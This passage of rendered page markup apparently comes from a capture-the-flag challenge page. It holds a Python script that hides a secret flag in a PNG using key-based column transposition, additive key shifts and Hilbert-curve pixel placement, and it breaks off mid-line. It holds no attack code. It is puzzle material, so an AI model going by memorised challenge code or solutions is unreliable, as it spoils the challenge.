string.printable[randint(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">61\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> s\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sox\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, d):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y, t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, d\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> s \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">u \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">v \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">^\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> spin(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s, x, y, u, v)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x, y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">spin\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, x, y, u, v):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y, x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x, y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">encrypt\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(msg, key, n):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pad(msg, n \u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg, _key \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _msg], [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> key]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Image.new(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'RGBA'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (n, n), \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'darkblue'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">pix \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.load()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(key)):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">w \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_key)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">h \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">arr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [[_msg[w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y] \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(h)] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_conf \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sorted\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([(_key[i], i) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_marshal \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [arr[_conf[i][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> functools.reduce(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> a, r: a \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _marshal[r], \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w), [])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">list\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">filter\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x: x \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, _msg))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [(_msg[_] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _key[_ \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w]) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> d \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sox(n, d)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">pix[x,y] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (_msg[d], _msg[d], _msg[d])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">keysum \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sum\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_key) \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">orient \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> keysum \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.rotate(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">90\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">orient)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">assert\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(key) \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">3\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> encrypt(flag, key, n)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">img.save(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'enc.png'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"#!/usr/bin/env python3import sysimport mathimport functoolsfrom PIL import Imagefrom random import randintimport stringfrom secret import flag, key, ndef pad(s, l):        while len(s) \u003C l:                s += string.printable[randint(0, 61)]        return sdef sox(n, d):        x, y, t = 0, 0, d        for s in range(n - 1):                u = 1 &#x26; t // 2                v = 1 &#x26; t ^ u                x, y = spin(2**s, x, y, u, v)                x += 2**s * u                y += 2**s * v                t = t // 4        return x, ydef spin(n, x, y, u, v):        if v == 0:                if u == 1:                        x = n - 1 - x                        y = n - 1 - y                x, y = y, x        return x, ydef encrypt(msg, key, n):        _msg = pad(msg, n ** 2)        _msg, _key = [ord(_) for _ in _msg], [ord(_) for _ in key]        img = Image.new(&#x27;RGBA&#x27;, (n, n), &#x27;darkblue&#x27;)        pix = img.load()        for _ in range(len(key)):                w = len(_key)                h = n**2 // w + 1                arr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]                _conf = sorted([(_key[i], i) for i in range(w)])                _marshal = [arr[_conf[i][1]] for i in range(w)]                _msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])                _msg = list(filter(lambda x: x is not None, _msg))                _msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]        for d in range(n**2):                x, y = sox(n, d)                pix[x,y] = (_msg[d], _msg[d], _msg[d])        keysum = sum(_key) if w > 0 else 0        orient = keysum % 4        img = img.rotate(90*orient)        return imgassert len(key) == 3img = encrypt(flag, key, 